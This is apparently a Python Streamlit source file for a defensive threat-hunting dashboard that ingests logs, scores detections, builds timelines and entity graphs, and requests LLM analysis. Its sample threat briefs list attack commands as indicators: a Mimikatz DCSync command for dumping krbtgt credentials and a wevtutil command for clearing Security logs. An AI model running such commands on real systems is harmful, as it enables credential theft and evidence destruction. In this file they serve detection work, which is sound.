        "summary": "A multi-stage Active Directory attack was executed where the threat actor leveraged a compromised user account to request a TGS ticket with weak RC4 encryption (Kerberoasting) and request a TGT ticket with an anomalous 99,999-minute lifetime (Golden Ticket behavior). This was followed by running Mimikatz DCSync to replicate krbtgt credentials and executing anti-forensic event log clearing commands on the Domain Controller.",
        "behaviors": [
            "Kerberoasting behavior identified via TGS ticket request with weak RC4 encryption.",
            "Golden Ticket persistence attempt identified by an anomalous TGT request lifetime of 99,999 minutes.",
            "Credential dumping via DCSync replication requested from Domain Controller DC-01 using Mimikatz.",
            "Anti-forensic log clearing using wevtutil.exe to wipe Security event logs."
        ],
        "iocs": [
            "Account: user.alice",
            "Service SPN: MSSQLSvc/db-prod.corp:1433",
            "Ticket Lifetime: 99999 minutes",
            "Host: DC-01",
            "Process: mimikatz.exe",
            "Command: lsadump::dcsync /domain:corp.local /user:krbtgt",
            "Process: wevtutil.exe (wevtutil.exe cl Security)"
        ]
    },
    "API Token Abuse & Data Scraping": {
        "summary": "An adversary hijacked compromised system API client credentials from an anomalous IP address to generate a high-privilege access token, executed massive queries against customer databases to harvest over 5.28 million PII records, dumped the harvested data to a local CSV file, and exfiltrated the file to mega.nz using curl.",
        "behaviors": [
            "Token generation using a system client ID from a suspicious untrusted IP address.",
            "Anomalous database query volume retrieving millions of customer PII records.",
            "Outbound exfiltration of PII dump file via curl to mega.nz."
        ],
        "iocs": [
            "Client ID: analytics-sync-service",
            "IP: 45.227.254.12",
            "Database Query: SELECT * FROM customers_pii",
            "Volume: 5,280,000 records",
            "Host: api-gateway-01",
            "File: pii_dump.csv",
            "Domain: mega.nz"
        ]
    }
}

# =========================
# SESSION STATE INITIALIZATION
# =========================

if "raw_telemetry" not in st.session_state:
    st.session_state.raw_telemetry = sample_logs["Full Correlated Hunt Case"]
if "last_selected_source" not in st.session_state:
    st.session_state.last_selected_source = "Full Correlated Hunt Case"
if "last_data_source" not in st.session_state:
    st.session_state.last_data_source = "Built-in Samples"

# =========================
# SIDEBAR
# =========================

st.sidebar.header("ThreatScope Settings")

data_source = st.sidebar.selectbox(
    "Data Source",
    [
        "Built-in Samples",
        "Elastic SIEM Connector (Local Demo)"
    ]
)

alert_threshold = st.sidebar.slider(
    "Alert Threshold",
    1,
    15,
    8
)

st.sidebar.success("Autonomous Hunt Engine Enabled")
st.sidebar.write("Status: ACTIVE")
st.sidebar.write("Polling telemetry")
st.sidebar.write("Running detection engine")
st.sidebar.write("Building entity graph")
st.sidebar.write("Generating AI analysis")

# Bind global telemetry text
input_text = st.session_state.raw_telemetry

# =========================
# TAB 1: DATA INGESTION
# =========================

with tab_ingest:
    st.markdown("<h3 style='color:#e2e8f0; font-family:sans-serif; margin-bottom:15px;'>TELEMETRY DATA SOURCE</h3>", unsafe_allow_html=True)
    
    if data_source != st.session_state.last_data_source:
        st.session_state.last_data_source = data_source
        if data_source == "Built-in Samples":
            st.session_state.raw_telemetry = sample_logs[st.session_state.last_selected_source]
        else:
            st.session_state.raw_telemetry = ""
        st.rerun()

    if data_source == "Built-in Samples":
        selected_source = st.selectbox(
            "Simulated SIEM / Environment Source",
            list(sample_logs.keys())
        )
        if selected_source != st.session_state.last_selected_source:
            st.session_state.last_selected_source = selected_source
            st.session_state.raw_telemetry = sample_logs[selected_source]
            st.rerun()

    elif data_source == "Elastic SIEM Connector (Local Demo)":
        st.subheader("Elastic SIEM Connector")
        elastic_index = st.text_input("Elastic Index", value="threatscope-logs")
        limit = st.slider("Number of Events", 5, 100, 25)
        
        col_conn1, col_conn2 = st.columns([3, 1])
        with col_conn1:
            connect_clicked = st.button("🔌 CONNECT & PULL", use_container_width=True)
        with col_conn2:
            clear_conn_clicked = st.button("CLEAR", use_container_width=True)
            if clear_conn_clicked:
                st.session_state.raw_telemetry = ""
                st.rerun()
                
        if connect_clicked:
            try:
                elastic_events = fetch_elastic_events(index_name=elastic_index, limit=limit)
                st.success(f"Connected to Elastic index: {elastic_index}")
                st.session_state.raw_telemetry = events_to_text(elastic_events)
                st.rerun()
            except Exception as error:
                st.error(f"Elastic connection failed: {error}")

    st.markdown("<hr style='border-color: #1e293b;' />", unsafe_allow_html=True)
    
    col_left, col_right = st.columns(2)
    
    with col_left:
        st.markdown("<h4 style='color:#cbd5e1; font-family:sans-serif; margin-top:0;'>MANUAL INPUT SOURCE</h4>", unsafe_allow_html=True)
        
        uploaded_file = st.file_uploader(
            "Drag & Drop Intel Files Here (Supports .pdf, .txt)",
            type=["pdf", "txt"],
            key="manual_file_uploader",
            label_visibility="collapsed"
        )
        if uploaded_file is not None:
            file_text = extract_text_from_file(uploaded_file)
            if file_text != st.session_state.raw_telemetry:
                st.session_state.raw_telemetry = file_text
                st.rerun()
                
        url_col1, url_col2 = st.columns([3, 1])
        with url_col1:
            url_input = st.text_input(
                "Paste Threat Report URL", 
                placeholder="Paste Threat Report URL (e.g., thedfirreport.com/ioc...)",
                label_visibility="collapsed",
                key="threat_url_input"
            )
        with url_col2:
            fetch_clicked = st.button("⚡ FETCH", use_container_width=True)
            
        if fetch_clicked and url_input:
            with st.spinner("Fetching URL content..."):
                fetched_text = fetch_url_content(url_input)
                if fetched_text != st.session_state.raw_telemetry:
                    st.session_state.raw_telemetry = fetched_text
                    st.rerun()
                    
        st.markdown("<br>", unsafe_allow_html=True)
        
        header_col1, header_col2 = st.columns([3, 1])
        with header_col1:
            st.markdown("<h5 style='color:#cbd5e1; font-family:sans-serif; margin-top:0;'>RAW TEXT EXTRACTION</h5>", unsafe_allow_html=True)
        with header_col2:
            clear_clicked = st.button("CLEAR", type="secondary", use_container_width=True, key="clear_raw_text_btn")
            if clear_clicked:
                st.session_state.raw_telemetry = ""
                st.rerun()
                
        input_text_area = st.text_area(
            "Raw Telemetry Data Editor",
            value=st.session_state.raw_telemetry,
            height=320,
            label_visibility="collapsed",
            key="raw_telemetry_editor"
        )
        if input_text_area != st.session_state.raw_telemetry:
            st.session_state.raw_telemetry = input_text_area
            st.rerun()
            
        ingest_clicked = st.button("⚡ Ingest to Backend", use_container_width=True, key="ingest_to_backend_action_btn")
        if ingest_clicked:
            if not st.session_state.raw_telemetry.strip():
                st.warning("No telemetry data to ingest.")
            else:
                try:
                    es = Elasticsearch("http://localhost:9200")
                    if not es.ping():
                        st.error("Elasticsearch is not running or unreachable at http://localhost:9200")
                    else:
                        lines = st.session_state.raw_telemetry.strip().split("\n")
                        success_count = 0
                        for line in lines:
                            parsed = parse_log_line(line)
                            if parsed:
                                es.index(index="threatscope-logs", document=parsed)
                                success_count += 1
                        if success_count > 0:
                            st.success(f"Successfully ingested {success_count} logs into Elasticsearch index 'threatscope-logs'!")
                        else:
                            st.warning("No valid events parsed from telemetry. Ensure logs are JSON or space-separated key=value lines.")
                except Exception as err:
                    st.error(f"Ingestion failed: {err}")

    with col_right:
        header_r1, header_r2 = st.columns([2, 1])
        with header_r1:
            st.markdown("<h4 style='color:#cbd5e1; font-family:sans-serif; margin-top:0;'>EXTRACTED THREAT BRIEF</h4>", unsafe_allow_html=True)
        with header_r2:
            matched_sample = None
            for sample_name, sample_text in sample_logs.items():
                if st.session_state.raw_telemetry.strip() == sample_text.strip():
                    matched_sample = sample_name
                    break
                    
            if matched_sample:
                brief = pre_extracted_briefs[matched_sample]
            else:
                brief = extract_threat_brief_from_llm(st.session_state.raw_telemetry)
                
            brief_md = f"""# Extracted Threat Brief

## Summary
{brief['summary']}

## Behavioral Indicators
""" + "\n".join([f"- {b}" for b in brief['behaviors']]) + """

## Indicators of Compromise
""" + "\n".join([f"- {ioc}" for ioc in brief['iocs']])

            st.download_button(
                label="📄 EXPORT BRIEF",
                data=brief_md,
                file_name="extracted_threat_brief.md",
                mime="text/markdown",
                use_container_width=True,
                key="export_threat_brief_download_btn"
            )
            
        render_card("Summary", brief['summary'], "#00f0ff")
        
        behaviors_html = ""
        if brief['behaviors'] and not (len(brief['behaviors']) == 1 and "No behaviors" in brief['behaviors'][0]):
            behaviors_html = "".join([f"<p style='margin: 4px 0; font-family: sans-serif;'>• {b}</p>" for b in brief['behaviors']])
        else:
            behaviors_html = "<p style='font-style: italic; color: #64748b; font-family: sans-serif;'>No behaviors extracted.</p>"
        render_card("Behavioral Indicators", behaviors_html, "#ff4d4d")
        
        iocs_html = ""
        if brief['iocs'] and not (len(brief['iocs']) == 1 and "No IOCs" in brief['iocs'][0]):
            iocs_html = "".join([f"<p style='margin: 4px 0; font-family: sans-serif;'>• {ioc}</p>" for ioc in brief['iocs']])
        else:
            iocs_html = "<p style='font-style: italic; color: #64748b; font-family: sans-serif;'>No IOCs extracted.</p>"
        render_card("Indicators of Compromise", iocs_html, "#ff9933")

# =========================
# PARSING RAW TELEMETRY (GLOBAL RUN)
# =========================

parsed_events = []
if input_text.strip():
    for line in input_text.strip().split("\n"):
        parsed = parse_log_line(line)
        if parsed:
            parsed_events.append(parsed)

# =========================
# THREAT DETECTION RUN
# =========================

detections = run_detections(parsed_events, raw_text=input_text)

# =========================
# RISK SCORING
# =========================

risk_score = 0
severity_weights = {"LOW": 1, "MEDIUM": 2, "HIGH": 3, "CRITICAL": 4}
for detection in detections:
    risk_score += severity_weights.get(detection["severity"], 1)

if risk_score >= 12:
    severity = "CRITICAL"
elif risk_score >= 8:
    severity = "HIGH"
elif risk_score >= 4:
    severity = "MEDIUM"
else:
    severity = "LOW"

# =========================
# MAPPED TECHNIQUES
# =========================

mapped_techniques = set()
for detection in detections:
    mapped_techniques.add(detection["mitre"])

# =========================
# TIMELINE EXTRACTION
# =========================

timeline_events = []
if len(parsed_events) > 0:
    for ev in parsed_events:
        ts = ev.get("@timestamp") or ev.get("timestamp") or ev.get("time") or ""
        if not ts:
            continue
        
        time_display = ts
        match = re.search(r'T(\d{2}:\d{2}(?::\d{2})?)', ts)
        if match:
            time_display = match.group(1)
            
        event_desc = ""
        event_type = ev.get("event") or ev.get("event.name") or ev.get("event.action") or ""
        
        if event_type == "vpn_login":
            user = ev.get("user") or ev.get("actor") or "Unknown"
            country = ev.get("country", "")
            country_str = f" from {country}" if country else ""
            event_desc = f"VPN Login Success: {user}{country_str}"
        elif event_type == "mfa_push":
            user = ev.get("user") or "Unknown"
            result = ev.get("result") or "approved"
            event_desc = f"MFA Push Notification {result.capitalize()} for {user}"
        elif ev.get("protocol") == "ssh" or event_type == "remote_mgmt_enabled":
            actor = ev.get("actor") or "Unknown"
            event_desc = f"SSH Remote Management Enabled by {actor}"
        elif "powershell.exe" in str(ev.get("process", "")).lower():
            host = ev.get("host") or "Unknown Host"
            event_desc = f"PowerShell Process Execution on {host}"
        elif "wmic.exe" in str(ev.get("process", "")).lower():
            host = ev.get("host") or "Unknown Host"
            event_desc = f"WMI Process Execution on {host}"
        elif ev.get("role") or event_type == "azure_role_assignment":
            role = ev.get("role") or "GlobalAdmin"
            user = ev.get("user") or ev.get("actor") or "Unknown"
            event_desc = f"Cloud Role Assigned: {role} to {user}"
        elif ev.get("oauth_app_consent") or "oauth" in str(ev).lower():
            app = ev.get("oauth_app_consent") or ev.get("app") or "Unknown App"
            event_desc = f"OAuth Consent Granted to {app}"
        elif ev.get("protocol") == "SS7":
            count = ev.get("subscriber_count") or ""
            count_str = f" ({count} subscribers)" if count else ""
            event_desc = f"SS7 Location Query Volume Spike{count_str}"
        elif ev.get("protocol") == "Diameter":
            event_desc = "Diameter Roaming Authentication Anomaly"
        elif ev.get("protocol") == "GTP":
            event_desc = "GTP Roaming Session Anomaly"
        elif ev.get("applicant"):
            applicant = ev.get("applicant") or "Unknown"
            status = ev.get("verification_status") or "unverified"
            event_desc = f"HR Onboarding On-risk check: {applicant} ({status})"
        elif ev.get("login_location_change") or ev.get("worker"):
            worker = ev.get("worker") or "Unknown"
            change = ev.get("login_location_change") or ""
            change_str = f" ({change})" if change else ""
            event_desc = f"Impossible Travel / Geo-velocity Alert: {worker}{change_str}"
        else:
            desc_parts = []
            for k, v in ev.items():
                if k not in ["@timestamp", "source", "category"]:
                    desc_parts.append(f"{k}={v}")
            event_desc = ", ".join(desc_parts)[:80]
            if not event_desc:
                event_desc = f"Event type: {event_type or 'generic'}"

        sev = "LOW"
        ev_str = str(ev).lower()
        if "globaladmin" in ev_str or "oauth" in ev_str or "critical" in ev_str:
            sev = "CRITICAL"
        elif "powershell.exe" in ev_str or "wmic.exe" in ev_str or "vpn_login" in ev_str or "ss7" in ev_str or "diameter" in ev_str or "gtp" in ev_str or "high" in ev_str:
            sev = "HIGH"
        elif "mfa_push" in ev_str or "unverified" in ev_str or "medium" in ev_str:
            sev = "MEDIUM"
            
        timeline_events.append({
            "time": time_display,
            "raw_time": ts,
            "event": event_desc,
            "severity": sev
        })
    timeline_events.sort(key=lambda x: x["raw_time"])
else:
    if "vpn_login" in input_text:
        timeline_events.append({"time": "07:41", "event": "Foreign VPN Login", "severity": "HIGH", "raw_time": "07:41"})
    if "mfa_push" in input_text:
        timeline_events.append({"time": "07:48", "event": "MFA Approval", "severity": "MEDIUM", "raw_time": "07:48"})
    if "protocol=ssh" in input_text or 'protocol": "ssh' in input_text:
        timeline_events.append({"time": "07:56", "event": "SSH Remote Management Enabled", "severity": "HIGH", "raw_time": "07:56"})
    if "powershell.exe" in input_text:
        timeline_events.append({"time": "08:02", "event": "PowerShell Execution", "severity": "HIGH", "raw_time": "08:02"})
    if "wmic.exe" in input_text:
        timeline_events.append({"time": "08:04", "event": "WMI Remote Execution", "severity": "HIGH", "raw_time": "08:04"})
    if "GlobalAdmin" in input_text:
        timeline_events.append({"time": "08:06", "event": "Privileged Role Escalation", "severity": "CRITICAL", "raw_time": "08:06"})
    if "Diameter" in input_text:
        timeline_events.append({"time": "08:21", "event": "Diameter Roaming Authentication Anomaly", "severity": "HIGH", "raw_time": "08:21"})
    if "SS7" in input_text:
        timeline_events.append({"time": "08:25", "event": "SS7 Signaling Spike", "severity": "HIGH", "raw_time": "08:25"})
    if "GTP" in input_text:
        timeline_events.append({"time": "08:29", "event": "GTP Roaming Session Anomaly", "severity": "HIGH", "raw_time": "08:29"})
    if "unverified" in input_text:
        timeline_events.append({"time": "08:31", "event": "Unverified Contractor Access Request", "severity": "MEDIUM", "raw_time": "08:31"})
    if "oauth" in input_text.lower():
        timeline_events.append({"time": "08:44", "event": "OAuth Persistence Activity", "severity": "CRITICAL", "raw_time": "08:44"})


# =========================
# TAB 2: DETECTIONS & TIMELINE
# =========================

with tab_hunt:
    if severity == "CRITICAL":
        st.error("ALERT: Critical correlated threat activity detected")
    elif severity == "HIGH":
        st.warning("WARNING: High-risk suspicious activity identified")
    elif severity == "MEDIUM":
        st.info("NOTICE: Medium-risk suspicious activity observed")
    else:
        st.success("No significant threat indicators detected")
        
    st.subheader("Autonomous Hunt Metrics")
    col_m1, col_m2, col_m3 = st.columns(3)
    
    sev_colors = {
        "CRITICAL": "#ef4444",
        "HIGH": "#f97316",
        "MEDIUM": "#eab308",
        "LOW": "#10b981"
    }
    sev_icons = {
        "CRITICAL": "☣️",
        "HIGH": "⚠️",
        "MEDIUM": "🔔",
        "LOW": "✅"
    }
    
    with col_m1:
        render_metric_card("Risk Score", risk_score, "#00f0ff", "⚡")
    with col_m2:
        render_metric_card("Overall Severity", severity, sev_colors.get(severity, "#cbd5e1"), sev_icons.get(severity, "ℹ️"))
    with col_m3:
        render_metric_card("Correlated Detections", len(detections), "#a855f7", "🔍")
        
    st.markdown("<br><hr style='border-color: #1e293b;' />", unsafe_allow_html=True)
    
    col_det, col_time = st.columns([5, 4])
    
    with col_det:
        st.subheader("ThreatScope Detection Engine")
        if len(detections) > 0:
            for detection in detections:
                render_detection_card(detection)
        else:
            st.success("No significant detections identified.")
            
        st.markdown("<br>", unsafe_allow_html=True)
        st.subheader("MITRE ATT&CK Mapping")
        if len(mapped_techniques) > 0:
            for technique in sorted(mapped_techniques):
                st.write(f"- {technique}")
        else:
            st.write("No ATT&CK mappings identified.")

    with col_time:
        st.subheader("Threat Timeline")
        if len(timeline_events) > 0:
            st.markdown('<div class="timeline-container">', unsafe_allow_html=True)
            for event in timeline_events:
                sev_class = event["severity"].lower()
                st.markdown(f"""
                <div class="timeline-node {sev_class}">
                    <span class="timeline-time">[{event['time']}]</span> 
                    <span style="color: #cbd5e1; font-family: sans-serif; font-size: 0.95rem; margin-left: 5px;">{event['event']}</span>
                </div>
                """, unsafe_allow_html=True)
            st.markdown('</div>', unsafe_allow_html=True)
        else:
            st.success("No correlated timeline activity identified.")


# =========================
# TAB 3: ENTITY GRAPH
# =========================

with tab_graph:
    st.subheader("Entity Correlation Graph")
    
    graph = nx.Graph()
    
    if len(parsed_events) > 0:
        entity_types = {
            "user": {"color": "#ff4d4d", "keys": ["user", "actor", "worker", "username"]},
            "ip": {"color": "#ff9933", "keys": ["source_ip", "dest_ip", "ip"]},
            "host": {"color": "#a855f7", "keys": ["host", "hostname", "device"]},
            "process": {"color": "#eab308", "keys": ["process", "process.name"]},
            "role": {"color": "#ec4899", "keys": ["role"]},
            "app": {"color": "#3b82f6", "keys": ["oauth_app_consent", "app"]},
            "protocol": {"color": "#10b981", "keys": ["protocol"]}
        }
        
        def add_node_if_new(name, category):
            color = entity_types[category]["color"]
            if name and name not in graph:
                graph.add_node(name, color=color, title=f"{category.capitalize()}: {name}", label=name)

        for ev in parsed_events:
            event_entities = []
            for category, cfg in entity_types.items():
                for key in cfg["keys"]:
                    val = ev.get(key)
                    if val:
                        val_str = str(val).strip()
                        if val_str and val_str.lower() != "none" and val_str.lower() != "null":
                            add_node_if_new(val_str, category)
                            event_entities.append(val_str)
            
            for k, v in ev.items():
                if isinstance(v, str):
                    ips = re.findall(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', v)
                    for ip in ips:
                        add_node_if_new(ip, "ip")
                        event_entities.append(ip)

            if len(event_entities) > 1:
                central_node = None
                for ent in event_entities:
                    for category in ["user", "host"]:
                        for key in entity_types[category]["keys"]:
                            if ev.get(key) == ent:
                                central_node = ent
                                break
                        if central_node:
                            break
                
                if not central_node:
                    central_node = event_entities[0]
                    
                for ent in event_entities:
                    if ent != central_node:
                        graph.add_edge(central_node, ent)
    else:
        def add_graph_node(name, color):
            if name not in graph:
                graph.add_node(name, color=color, title=name, label=name)
                
        if "contractor.mills" in input_text:
            add_graph_node("contractor.mills", "red")
        if "185.220.101.44" in input_text:
            add_graph_node("185.220.101.44", "orange")
        if "104.28.45.12" in input_text:
            add_graph_node("104.28.45.12", "orange")
        if "cisco-edge-12" in input_text:
            add_graph_node("cisco-edge-12", "purple")
        if "CORP-LT-448" in input_text:
            add_graph_node("CORP-LT-448", "purple")
        if "powershell.exe" in input_text:
            add_graph_node("powershell.exe", "yellow")
        if "wmic.exe" in input_text:
            add_graph_node("wmic.exe", "yellow")
        if "GlobalAdmin" in input_text:
            add_graph_node("GlobalAdmin", "pink")
        if "UnknownMailSync" in input_text:
            add_graph_node("UnknownMailSync", "blue")
        if "Diameter" in input_text:
            add_graph_node("Diameter", "green")
        if "SS7" in input_text:
            add_graph_node("SS7", "green")
        if "GTP" in input_text:
            add_graph_node("GTP", "green")
        if "remote.engineer.17" in input_text:
            add_graph_node("remote.engineer.17", "gray")

        if "contractor.mills" in input_text and "185.220.101.44" in input_text:
            graph.add_edge("contractor.mills", "185.220.101.44")
        if "contractor.mills" in input_text and "104.28.45.12" in input_text:
            graph.add_edge("contractor.mills", "104.28.45.12")
        if "contractor.mills" in input_text and "cisco-edge-12" in input_text:
            graph.add_edge("contractor.mills", "cisco-edge-12")
        if "contractor.mills" in input_text and "CORP-LT-448" in input_text:
            graph.add_edge("contractor.mills", "CORP-LT-448")
        if "CORP-LT-448" in input_text and "powershell.exe" in input_text:
            graph.add_edge("CORP-LT-448", "powershell.exe")
        if "powershell.exe" in input_text and "wmic.exe" in input_text:
            graph.add_edge("powershell.exe", "wmic.exe")
        if "contractor.mills" in input_text and "GlobalAdmin" in input_text:
            graph.add_edge("contractor.mills", "GlobalAdmin")
        if "contractor.mills" in input_text and "UnknownMailSync" in input_text:
            graph.add_edge("contractor.mills", "UnknownMailSync")
        if "contractor.mills" in input_text and "Diameter" in input_text:
            graph.add_edge("contractor.mills", "Diameter")
        if "contractor.mills" in input_text and "SS7" in input_text:
            graph.add_edge("contractor.mills", "SS7")
        if "contractor.mills" in input_text and "GTP" in input_text:
            graph.add_edge("contractor.mills", "GTP")
        if "remote.engineer.17" in input_text and "contractor.mills" in input_text:
            graph.add_edge("remote.engineer.17", "contractor.mills")

    if len(graph.nodes) > 0:
        net = Network(
            height="500px",
            width="100%",
            bgcolor="#111111",
            font_color="white"
        )
        net.from_nx(graph)
        with tempfile.NamedTemporaryFile(delete=False, suffix=".html") as tmp_file:
            net.save_graph(tmp_file.name)
            with open(tmp_file.name, "r", encoding="utf-8") as graph_file:
                html_content = graph_file.read()
        st.components.v1.html(html_content, height=550)
    else:
        st.info("No entity relationships identified.")


# =========================
# TAB 4: AI ANALYSIS & REPORT
# =========================

with tab_report:
    st.subheader("Hunt Summary")
    
    if len(detections) > 0:
        st.write(
            "ThreatScope identified correlated suspicious activity across identity, infrastructure, endpoint, and telecom telemetry sources."
        )
    else:
        st.write(
            "No significant suspicious activity identified in current telemetry."
        )
        
    st.markdown("<hr style='border-color: #1e293b;' />", unsafe_allow_html=True)
    
    col_rep_left, col_rep_right = st.columns(2)
    
    with col_rep_left:
        st.subheader("Hunt Report Export")
        
        report_lines = []
        report_lines.append("# ThreatScope Hunt Report")
        report_lines.append("")
        report_lines.append("## Executive Summary")
        report_lines.append(
            f"ThreatScope identified {len(detections)} detection(s) with an overall severity of {severity} and a risk score of {risk_score}."
        )
        report_lines.append("")
        report_lines.append("## Detection Findings")
        report_lines.append("")
        
        if len(detections) > 0:
            for detection in detections:
                report_lines.append(f"### {detection['title']}")
                report_lines.append(f"- Severity: {detection['severity']}")
                report_lines.append(f"- Confidence: {detection['confidence']}")
                report_lines.append(f"- MITRE ATT&CK: {detection['mitre']}")
                report_lines.append(f"- Description: {detection['description']}")
                report_lines.append(f"- Hunt Pivot: {detection['hunt_pivot']}")
                report_lines.append("")
        else:
            report_lines.append("No significant detections identified.")
            report_lines.append("")
            
        report_lines.append("## Timeline")
        report_lines.append("")
        
        if len(timeline_events) > 0:
            for event in timeline_events:
                report_lines.append(
                    f"- {event['time']} | {event['event']} | {event['severity']}"
                )
        else:
            report_lines.append("No timeline events identified.")
            
        report_lines.append("")
        report_lines.append("## Recommended Next Steps")
        report_lines.append("")
        report_lines.append("- Validate the source IPs, users, and devices involved.")
        report_lines.append("- Review privileged role assignments and OAuth consent grants.")
        report_lines.append("- Investigate telecom signaling anomalies across SS7, Diameter, and GTP.")
        report_lines.append("- Confirm whether activity aligns with approved maintenance or contractor access.")
        report_lines.append("- Preserve relevant logs for incident response review.")
        report_lines.append("")
        
        hunt_report = "\n".join(report_lines)
        
        st.download_button(
            label="Download Hunt Report (.md)",
            data=hunt_report,
            file_name="threatscope_hunt_report.md",
            mime="text/markdown",
            use_container_width=True
        )
        
        with st.expander("Preview Hunt Report"):
            st.markdown(hunt_report)
            
    with col_rep_right:
        st.subheader("AI-Assisted Analysis")
        
        st.info(
            "AI-assisted analysis is generated on demand to conserve API usage."
        )
        
        # Build prompt
        prompt = f"""
You are a defensive cyber threat intelligence analyst supporting a telecom environment.

Analyze the telemetry for:

- Initial Access Broker activity
- VPN compromise
- MFA abuse
- PowerShell abuse
- WMI execution
- Living-off-the-land techniques
- SS7 abuse
- Diameter abuse
- GTP abuse
- cloud privilege escalation
- OAuth persistence
- contractor fraud
- insider threat
- telecom signaling abuse
- edge infrastructure targeting

Telemetry:
{input_text}

Structured Detections:
{json.dumps(detections, indent=2)}

Timeline:
{json.dumps(timeline_events, indent=2)}

Risk Score:
{risk_score}

Severity:
{severity}

Provide:

1. Executive Summary
2. Correlated Threat Indicators
3. Potential Threat Actor Behavior
4. MITRE ATT&CK Mapping
5. Telecom Threat Risk
6. Identity Risk
7. Recommended Hunt Queries
8. Recommended Containment Steps
9. False Positive Considerations
10. Confidence
11. Severity

Focus ONLY on defensive analysis and threat hunting.
"""
        
        if st.button("Generate AI Analysis", use_container_width=True):
            try:
                with st.spinner("Analyzing telemetry with ThreatScope AI..."):
                    response = client.chat.completions.create(
                        model="llama-3.3-70b-versatile",
                        messages=[
                            {
                                "role": "system",
                                "content": "You are a defensive cyber threat intelligence analyst. Only provide defensive analysis, threat hunting guidance, and containment recommendations."
                            },
                            {
                                "role": "user",
                                "content": prompt
                            }
                        ],
                        temperature=0.3,
                        max_tokens=1200
                    )
                
                ai_output = response.choices[0].message.content
                if ai_output and ai_output.strip():
                    st.markdown(ai_output)
                else:
                    st.warning("Groq returned an empty response. Try again or reduce the prompt size.")
            except Exception as error:
                st.error("AI analysis failed.")
                st.exception(error)